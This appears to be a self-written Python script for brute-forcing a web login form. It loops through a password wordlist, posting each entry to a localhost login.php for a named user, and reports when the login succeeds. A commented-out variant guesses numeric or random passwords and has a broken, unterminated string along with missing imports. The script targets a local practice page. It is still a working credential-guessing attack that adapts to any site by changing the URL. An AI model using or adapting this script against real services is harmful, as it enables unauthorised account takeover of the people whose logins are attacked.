import requests

with open("password_new.txt") as f:
    
    passwords = f.read().splitlines()
#username = input("Enter Username To Hack: ") 
for password in passwords:
    
    response = requests.post("http://localhost/login.php", data={
        "username": "kirubel" , 
        "password": password
     })
    
  #  print(f"Request Url: {response.url}")
   # print(f"Request status code: {response.status_code}")
    
    if "You are logged in!" in response.text:
        print(f"Password cracked: {password}")
        break
else: 
    print("No password cracked!")


#it would be less efficient if i use for loop so i instead used 
"""import requests

for i in range(10000):
    password = f"{i:04d}"
    password =f'{"".join(random.choices(string.ascii_letters + string.digits,k=8))}
    response = requests.post("http://localhost/login.php", data={
        "username": "Dani", 
        "password": password
    })
    if "You are logged in!" in response.text:
        print(f"Password cracked: {password}")
        break
else: 
    print("No password cracked!")"""